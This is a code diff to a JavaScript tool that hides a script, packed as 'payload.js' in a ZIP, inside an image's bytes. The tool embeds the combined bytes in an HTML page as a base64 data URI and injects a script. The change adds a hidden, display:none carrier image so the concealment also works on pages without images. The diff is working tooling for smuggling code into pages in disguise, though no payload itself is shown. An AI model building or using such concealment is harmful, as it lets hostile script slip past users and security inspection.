@@ -134,8 +134,19 @@ export const engine = {
     'ZIP writing via JSZip (CDN) with an offline STORE-only fallback.',
 
   async execute({ html, js }) {
-    const imgTags = findImgTags(html);
-    if (!imgTags.length) throw new Error('No <img src=...> tags found in the page.');
+    let workingHtml = html;
+    let imgTags = findImgTags(workingHtml);
+    if (!imgTags.length) {
+      const carrierImg = '<img id="carrier-img" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAAWUlEQVRYR+2WwQkAMAhD6790F3WCOkEFPxJ40EtJ85o5s11n9m6Bq/4tA3oG9Azov0Avw8m90DOgZ0DPgJ4BPQN6BvQM6BnQM6BnQM+AngE9A3oG9Az8nIEP2l73E2wMsqEAAAAASUVORK5CYII=" style="display:none;" />';
+      if (workingHtml.includes('</body>')) {
+        workingHtml = workingHtml.replace('</body>', `${carrierImg}</body>`);
+      } else if (workingHtml.includes('</html>')) {
+        workingHtml = workingHtml.replace('</html>', `${carrierImg}</html>`);
+      } else {
+        workingHtml += carrierImg;
+      }
+      imgTags = findImgTags(workingHtml);
+    }
 
     const { index, bytes: imgBytes, note, srcStart, srcEnd } = await selectImage(imgTags);
     const mime = sniffMime(imgBytes);
@@ -144,7 +155,7 @@ export const engine = {
     const zipBytes = await buildZip('payload.js', utf8.encode(js));
     const combined = concatBytes(imgBytes, zipBytes); // single allocation
     let newHtml = replaceSpan(
-      html, srcStart, srcEnd, `data:${mime};base64,${bytesToBase64(combined)}`,
+      workingHtml, srcStart, srcEnd, `data:${mime};base64,${bytesToBase64(combined)}`,
     );
 
     newHtml = injectBeforeClose(newHtml, buildDebugScript(mime, index), { newline: false });
